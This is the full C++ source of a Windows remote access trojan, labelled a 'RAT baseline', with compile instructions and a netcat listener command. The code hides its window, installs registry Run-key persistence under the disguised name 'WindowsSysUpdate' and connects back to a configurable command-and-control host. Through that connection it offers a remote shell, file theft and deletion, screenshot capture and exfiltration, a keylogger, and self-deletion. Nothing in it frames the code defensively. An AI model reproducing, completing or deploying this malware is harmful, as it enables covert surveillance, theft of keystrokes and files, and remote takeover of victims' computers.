// rat_client.cpp
// Extended Windows 11 RAT baseline — C++17, Winsock2
// Compile: cl.exe rat_client.cpp /EHsc /O2 /link ws2_32.lib gdi32.lib
// Listener: nc -lvnp 4444

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <thread>
#include <mutex>
#include <queue>
#include <atomic>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")

namespace cfg {
    constexpr const char* C2_HOST = "127.0.0.1";   // replace with your C2 IP
    constexpr int         C2_PORT = 4444;
    constexpr int         RECONNECT_MS = 5000;
    constexpr int         HEARTBEAT_MS = 30000;
    constexpr bool        PERSISTENCE = true;
    constexpr bool        START_HIDDEN = true;
}

SOCKET g_sock = INVALID_SOCKET;
std::mutex g_sock_mtx;
std::atomic<bool> g_running{ true };

// --- keylogger state ---
std::mutex g_key_mtx;
std::string g_key_buffer;
std::atomic<bool> g_keylog_active{ false };
HHOOK g_key_hook = nullptr;

// --- helpers ---
std::string WsaError() {
    int code = WSAGetLastError();
    char buf[256] = {};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, code,
                   MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, 256, nullptr);
    return std::string(buf);
}

std::vector<std::string> SplitArgs(const std::string& line) {
    std::vector<std::string> parts;
    std::istringstream iss(line);
    std::string part;
    while (iss >> part) parts.push_back(part);
    return parts;
}

bool SendRaw(const std::string& data) {
    std::lock_guard<std::mutex> lock(g_sock_mtx);
    if (g_sock == INVALID_SOCKET) return false;
    int total = (int)data.size();
    int sent = 0;
    while (sent < total) {
        int n = send(g_sock, data.c_str() + sent, total - sent, 0);
        if (n <= 0) return false;
        sent += n;
    }
    return true;
}

bool SendLine(const std::string& line) {
    return SendRaw(line + "\n");
}

bool SendChunkHeader(const std::string& type, const std::string& meta, size_t len) {
    std::ostringstream ss;
    ss << "CHUNK " << type << " " << meta << " " << len << "\n";
    return SendRaw(ss.str());
}

std::string RecvUntil(const std::string& delim, int timeoutMs = 5000) {
    std::string buf;
    char c;
    DWORD start = GetTickCount();
    while (GetTickCount() - start < (DWORD)timeoutMs) {
        int n = recv(g_sock, &c, 1, 0);
        if (n > 0) {
            buf.push_back(c);
            if (buf.size() >= delim.size() &&
                buf.compare(buf.size() - delim.size(), delim.size(), delim) == 0) {
                buf.resize(buf.size() - delim.size());
                return buf;
            }
        } else if (n == 0) {
            return {};
        } else {
            int err = WSAGetLastError();
            if (err != WSAEWOULDBLOCK) return {};
            Sleep(50);
        }
    }
    return {};
}

// --- persistence ---
bool InstallPersistence() {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(nullptr, path, MAX_PATH)) return false;

    HKEY hKey;
    const char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    LONG res = RegSetValueExA(hKey, "WindowsSysUpdate", 0, REG_SZ,
                              (const BYTE*)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hKey);
    return res == ERROR_SUCCESS;
}

bool RemovePersistence() {
    HKEY hKey;
    const char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    LONG res = RegDeleteValueA(hKey, "WindowsSysUpdate");
    RegCloseKey(hKey);
    return res == ERROR_SUCCESS;
}

// --- process / system ---
std::string SysInfo() {
    std::ostringstream ss;
    char comp[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(comp);
    GetComputerNameA(comp, &sz);
    char user[256] = {};
    sz = sizeof(user);
    GetUserNameA(user, &sz);

    SYSTEM_INFO si;
    GetSystemInfo(&si);

    ss << "Host: " << comp << "\n"
       << "User: " << user << "\n"
       << "Arch: " << (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") << "\n"
       << "CPUs: " << si.dwNumberOfProcessors << "\n"
       << "Session ID: " << GetCurrentProcessId() << "\n";
    return ss.str();
}

std::string ListProcs() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "[!] snapshot failed\n";
    PROCESSENTRY32 pe = { sizeof(pe) };
    std::ostringstream ss;
    if (Process32First(snap, &pe)) {
        do {
            ss << "[" << pe.th32ProcessID << "] " << pe.szExeFile << "\n";
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return ss.str();
}

std::string KillProc(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return "[!] open process failed\n";
    bool ok = TerminateProcess(h, 0) == TRUE;
    CloseHandle(h);
    return ok ? "[+] killed " + std::to_string(pid) + "\n" : "[!] terminate failed\n";
}

// --- shell ---
std::string ShellExec(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "[!] pipe failed\n";

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr,
                        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return "[!] CreateProcess: " + WsaError() + "\n";
    }

    CloseHandle(hWrite);
    CloseHandle(pi.hThread);

    std::string out;
    char buffer[4096];
    DWORD read;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &read, nullptr) && read > 0) {
        buffer[read] = '\0';
        out.append(buffer, read);
    }
    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    return out.empty() ? "[ok]\n" : out;
}

// --- file ops ---
std::string ListDir(const std::string& path) {
    std::string search = path + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return "[!] list failed\n";
    std::ostringstream ss;
    do {
        ss << (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "[D] " : "[F] ")
           << fd.cFileName << "\n";
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return ss.str();
}

std::string ReadFileText(const std::string& path) {
    std::ifstream in(path, std::ios::binary);
    if (!in) return "[!] read failed: " + path + "\n";
    std::string data((std::istreambuf_iterator<char>(in)), {});
    return data;
}

std::string UploadFile(const std::string& localPath) {
    std::ifstream in(localPath, std::ios::binary | std::ios::ate);
    if (!in) return "[!] open failed: " + localPath + "\n";
    auto size = (size_t)in.tellg();
    in.seekg(0, std::ios::beg);
    std::string data((std::istreambuf_iterator<char>(in)), {});

    SendChunkHeader("file", localPath, size);
    if (SendRaw(data)) return "[+] uploaded " + localPath + " (" + std::to_string(size) + " bytes)\n";
    return "[!] send failed\n";
}

std::string DownloadFile(const std::string& remotePath, const std::string& localPath) {
    std::ifstream in(remotePath, std::ios::binary);
    if (!in) return "[!] open failed: " + remotePath + "\n";
    std::ofstream out(localPath, std::ios::binary);
    if (!out) return "[!] write failed: " + localPath + "\n";
    out << in.rdbuf();
    return "[+] downloaded " + remotePath + " -> " + localPath + "\n";
}

std::string DeleteFilePath(const std::string& path) {
    return DeleteFileA(path.c_str()) ? "[+] deleted\n" : "[!] delete failed\n";
}

// --- screenshot ---
std::string GetTempScreenshotPath() {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    return std::string(tmp) + "scr_" + std::to_string(GetTickCount()) + ".png";
}

bool SaveScreenshot(const std::string& path) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    HDC hScreen = GetDC(nullptr);
    HDC hDC = CreateCompatibleDC(hScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    std::wstring wpath(path.begin(), path.end());
    CLSID clsid;
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) {
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return false;
    }
    std::vector<Gdiplus::ImageCodecInfo> codecs(size);
    Gdiplus::GetImageEncoders(num, size, codecs.data());
    for (const auto& c : codecs) {
        if (std::wstring(c.MimeType) == L"image/png") {
            clsid = c.Clsid;
            break;
        }
    }
    bool ok = bitmap.Save(wpath.c_str(), &clsid, nullptr) == Gdiplus::Ok;

    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(nullptr, hScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return ok;
}

std::string Screenshot() {
    std::string path = GetTempScreenshotPath();
    if (!SaveScreenshot(path)) return "[!] screenshot failed\n";
    auto up = UploadFile(path);
    DeleteFileA(path.c_str());
    return up;
}

// --- keylogger ---
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = pKb->vkCode;
        char buf[32] = {};
        UINT scan = MapVirtualKeyA(vk, MAPVK_VK_TO_VSC);
        int len = GetKeyNameTextA(scan << 16, buf, sizeof(buf));
        if (len > 0) {
            std::string key = "[" + std::string(buf) + "]";
            if (vk == VK_RETURN) key = "\n";
            else if (vk == VK_SPACE) key = " ";
            else if (vk == VK_BACK) key = "<BS>";
            else if (vk == VK_TAB) key = "\t";
            else key = key.substr(1, key.size() - 2);
            std::lock_guard<std::mutex> lock(g_key_mtx);
            g_key_buffer += key;
            if (g_key_buffer.size() > 8192) {
                g_key_buffer.erase(0, g_key_buffer.size() - 4096);
            }
        }
    }
    return CallNextHookEx(g_key_hook, nCode, wParam, lParam);
}

void KeylogThread() {
    MSG msg;
    while (g_running && g_keylog_active) {
        while (PeekMessageA(&msg, nullptr, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        Sleep(50);
    }
}

std::string KeylogStart() {
    if (g_keylog_active) return "[*] already running\n";
    g_key_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyHookProc, GetModuleHandleA(nullptr), 0);
    if (!g_key_hook) return "[!] hook failed\n";
    g_keylog_active = true;
    std::thread(KeylogThread).detach();
    return "[+] keylogger started\n";
}

std::string KeylogDump() {
    std::lock_guard<std::mutex> lock(g_key_mtx);
    std::string out = g_key_buffer;
    g_key_buffer.clear();
    return out.empty() ? "[empty]\n" : out + "\n";
}

std::string KeylogStop() {
    if (!g_keylog_active) return "[*] not running\n";
    g_keylog_active = false;
    if (g_key_hook) { UnhookWindowsHookEx(g_key_hook); g_key_hook = nullptr; }
    return "[+] keylogger stopped\n";
}

// --- heartbeat ---
void HeartbeatThread() {
    while (g_running) {
        Sleep(cfg::HEARTBEAT_MS);
        if (!SendLine("[*] heartbeat")) break;
    }
}

// --- self-destruct ---
std::string SelfDelete() {
    char path[MAX_PATH];
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    std::string cmd = "/c timeout /t 1 > nul && del \"" + std::string(path) + "\"";
    ShellExecuteA(nullptr, "open", "cmd.exe", cmd.c_str(), nullptr, SW_HIDE);
    RemovePersistence();
    ExitProcess(0);
    return {};
}

// --- command dispatch ---
void Dispatch(const std::string& line) {
    auto args = SplitArgs(line);
    if (args.empty()) return;
    const std::string& cmd = args[0];
    std::string resp;

    if (cmd == "help") {
        resp =
            "info            - system info\n"
            "procs           - list processes\n"
            "kill <pid>      - kill process\n"
            "shell <cmd>     - execute shell command\n"
            "cd <dir>        - list directory contents\n"
            "cat <file>      - read text file\n"
            "upload <path>   - upload file to C2\n"
            "download <src> <dst> - download file from client\n"
            "del <path>      - delete file\n"
            "screenshot      - capture and upload screenshot\n"
            "keylog start    - start keylogger\n"
            "keylog dump     - dump keylog buffer\n"
            "keylog stop     - stop keylogger\n"
            "persist         - install registry persistence\n"
            "unpersist       - remove registry persistence\n"
            "delete          - self-delete and exit\n"
            "exit            - close session\n";
    } else if (cmd == "info") {
        resp = SysInfo();
    } else if (cmd == "procs") {
        resp = ListProcs();
    } else if (cmd == "kill" && args.size() > 1) {
        resp = KillProc((DWORD)std::stoul(args[1]));
    } else if (cmd == "shell") {
        std::string full = line.substr(5);
        resp = ShellExec("cmd.exe /c " + full);
    } else if (cmd == "cd" && args.size() > 1) {
        resp = ListDir(args[1]);
    } else if (cmd == "cat" && args.size() > 1) {
        resp = ReadFileText(args[1]);
    } else if (cmd == "upload" && args.size() > 1) {
        resp = UploadFile(args[1]);
    } else if (cmd == "download" && args.size() > 2) {
        resp = DownloadFile(args[1], args[2]);
    } else if (cmd == "del" && args.size() > 1) {
        resp = DeleteFilePath(args[1]);
    } else if (cmd == "screenshot") {
        resp = Screenshot();
    } else if (cmd == "keylog" && args.size() > 1) {
        if (args[1] == "start") resp = KeylogStart();
        else if (args[1] == "dump") resp = KeylogDump();
        else if (args[1] == "stop") resp = KeylogStop();
        else resp = "[?] keylog start|dump|stop\n";
    } else if (cmd == "persist") {
        resp = InstallPersistence() ? "[+] persistence installed\n" : "[!] failed\n";
    } else if (cmd == "unpersist") {
        resp = RemovePersistence() ? "[+] persistence removed\n" : "[!] failed\n";
    } else if (cmd == "delete") {
        SelfDelete();
        return;
    } else if (cmd == "exit") {
        SendLine("[*] bye");
        {
            std::lock_guard<std::mutex> lock(g_sock_mtx);
            closesocket(g_sock);
            g_sock = INVALID_SOCKET;
        }
        return;
    } else {
        resp = "[?] unknown command. type help\n";
    }

    SendLine(resp);
}

// --- networking ---
bool Connect() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return false;

    {
        std::lock_guard<std::mutex> lock(g_sock_mtx);
        g_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    }
    if (g_sock == INVALID_SOCKET) return false;

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(cfg::C2_PORT);
    inet_pton(AF_INET, cfg::C2_HOST, &addr.sin_addr);

    if (connect(g_sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
        WSACleanup();
        return false;
    }
    u_long mode = 1;
    ioctlsocket(g_sock, FIONBIO, &mode);
    return true;
}

// --- main ---
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    if (cfg::START_HIDDEN)
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (cfg::PERSISTENCE)
        InstallPersistence();

    std::thread(HeartbeatThread).detach();

    while (g_running) {
        if (Connect()) {
            SendLine("[*] session online");
            while (g_running && g_sock != INVALID_SOCKET) {
                std::string cmd = RecvUntil("\n", 60000);
                if (cmd.empty()) break;
                Dispatch(cmd);
            }
            {
                std::lock_guard<std::mutex> lock(g_sock_mtx);
                if (g_sock != INVALID_SOCKET) {
                    closesocket(g_sock);
                    g_sock = INVALID_SOCKET;
                }
            }
            WSACleanup();
        }
        Sleep(cfg::RECONNECT_MS);
    }
    return 0;
}
